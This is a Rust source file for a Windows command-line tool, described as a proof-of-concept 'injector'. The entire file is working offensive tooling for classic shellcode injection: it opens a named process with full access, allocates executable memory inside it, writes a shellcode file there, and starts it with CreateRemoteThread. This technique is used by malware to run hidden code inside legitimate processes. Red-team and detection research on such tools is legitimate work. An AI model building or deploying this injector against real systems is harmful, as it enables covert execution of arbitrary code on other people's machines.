use std::{ptr::null_mut, mem::size_of};
use clap::Parser;
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{Debug::WriteProcessMemory, ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
    },
};

/// Simple Injector for PoC
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The target process name (notepad.exe)
    #[arg(long)]
    process: String,

    /// The PIC file path (shellcode.bin)
    #[arg(long)]
    file: String,
}

fn main() {
    let args = Args::parse();

    let process_name = &args.process;
    let file_path = args.file;

    let process_id = get_process_id_by_name(process_name).expect("Failed to get process ID by name");
    println!("[+] Process ID: {}", process_id);

    let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");

    // Get a handle to the target process with PROCESS_ALL_ACCESS
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };

    if process_handle == 0 {
        panic!("Failed to open a handle to the target process");
    }

    println!("[+] Process handle: {:?}", process_handle);

    // Allocate memory in the target process for the shellcode
    let shellcode_address = unsafe {
        VirtualAllocEx(
            process_handle,
            null_mut(),
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    println!(
        "[+] Allocated memory in the target process for the shellcode: {:p}",
        shellcode_address
    );

    if shellcode_address.is_null() {
        panic!("Failed to allocate memory in the target process for the shellcode");
    }

    // Write the shellcode to the target process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_address as _,
            shellcode_bytes.as_ptr() as _,
            shellcode_bytes.len(),
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    //For debugging
    //pause();

    // Create remote thread and execute our shellcode
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            Some(std::mem::transmute(shellcode_address as usize)),
            std::ptr::null_mut(),
            0,
            null_mut(),
        )
    };

    // Close thread and process handle
    unsafe {
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    };
}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err("Failed to call CreateToolhelp32Snapshot".to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err("Failed to call Process32First".to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err("Failed to call Process32Next".to_owned());
        }
    }

    return Ok(process_entry.th32ProcessID);
}


/// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
